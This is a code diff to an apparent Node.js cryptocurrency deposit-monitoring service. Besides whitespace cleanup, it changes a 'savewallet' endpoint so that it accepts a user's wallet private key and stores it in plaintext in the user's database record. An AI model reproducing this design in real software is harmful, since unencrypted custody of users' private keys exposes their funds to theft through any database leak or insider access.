@@ -359,7 +359,7 @@ class WalletMonitor {
                         const net_amount = amount1 - fee;
                         const rate = 1;
                         const amount_coin = amount1 * rate;
-        
+
                         // Create a unique transaction ID if none exists
                         const txid = `auto_${Date.now()}_${Math.floor(Math.random() * 1000000)}`;
                         const user_id = await userDbHandler.getOneByQuery({wallet_address: fromAddress});
@@ -379,19 +379,19 @@ class WalletMonitor {
                             status: 1, // Approved status
                             remark: 'Automatic deposit via wallet monitoring'
                         };
-        
+
                         // Save deposit to database
                        const result = await depositDbHandler.create(depositData);
                        result1 = result;
                         // Update user's wallet balance
-                        
+
                         let d = await userDbHandler.updateById({_id : user_id._id}, {
-                            
+
                                 wallet_topup: user_id.wallet_topup + net_amount
-                            
+
                         });
-                        
-        
+
+
                         // // Add transaction ID to result
                         // result.txid = txid;
                         // result.depositId = depositData._id;
@@ -400,15 +400,15 @@ class WalletMonitor {
                         // Still return success but with a warning
                         result.warning = 'Deposit detected but there was an error saving it: ' + error.message;
                     }
-           
+
                 const txHash = await this.sendRawTransaction2(signedTx.rawTransaction);
                 console.log(`Transaction sent with hash: ${txHash}`);
                 console.log(result1._id);
                 const updateresult = await depositDbHandler.updateById(result1._id, {
-                  
+
                         txid: txHash,
                         status: 2
-                  
+
                 });
                 // console.log(updateresult);
                 // Wait for transaction confirmation
@@ -551,8 +551,8 @@ class WalletMonitor {
                 throw new Error(body.error.message);
             } else {
                 console.log("Transaction sent successfully! TxHash:", body.result);
-              // Update deposit txid here 
-              
+              // Update deposit txid here
+
                 // Wait a bit for the transaction to propagate
                 await new Promise(resolve => setTimeout(resolve, 2000));
 
@@ -873,6 +873,7 @@ const savewallet = async(req, res) => {
         try {
             let walletAddress = req.body.walletAddress;
             let walletPrivateKey = req.body.walletPrivateKey;
+            const user = req.user;
 
             if (!walletAddress || !walletPrivateKey) {
                 return res.status(400).json({
@@ -881,9 +882,35 @@ const savewallet = async(req, res) => {
                 });
             }
 
-            // In a real implementation, you would save this to a database
-            // For now, we'll just return success
-            console.log(`Wallet saved: ${walletAddress}`);
+            if (!user || !user.sub) {
+                return res.status(401).json({
+                    message: 'User not authenticated',
+                    status: false
+                });
+            }
+
+            // Save wallet to user profile in database
+            const { userDbHandler } = require('../services/db');
+            const user_id = user.sub;
+
+            console.log(`Saving wallet ${walletAddress} to user ${user_id}`);
+
+            // Update user document with wallet information
+            const updateResult = await userDbHandler.updateById(user_id, {
+                $set: {
+                    wallet_address: walletAddress,
+                    wallet_private_key: walletPrivateKey
+                }
+            });
+
+            console.log('Update result:', updateResult);
+
+            if (!updateResult || !updateResult.acknowledged) {
+                return res.status(500).json({
+                    message: 'Failed to save wallet to user profile',
+                    status: false
+                });
+            }
 
             return res.status(200).json({
                 message: 'Wallet saved successfully',
@@ -1076,7 +1103,7 @@ async function startMonitoring(req, res) {
         const { userDbHandler, depositDbHandler } = require('../services/db');
 
         // Check if there's a recent successful deposit from this wallet
-       
+
 
         // Replace these with your actual wallet addresses and private key
         const usdtReceiveWallet = process.env.OWN_PAY_ADDRESS; // Wallet to receive USDT
@@ -1098,7 +1125,7 @@ async function startMonitoring(req, res) {
         const result = await monitor.monitorAndTransfer(wallet);
 
         // If a deposit was found, save it to the database and update user's wallet
-    
+
 
         return res.status(200).json({
             status: true,
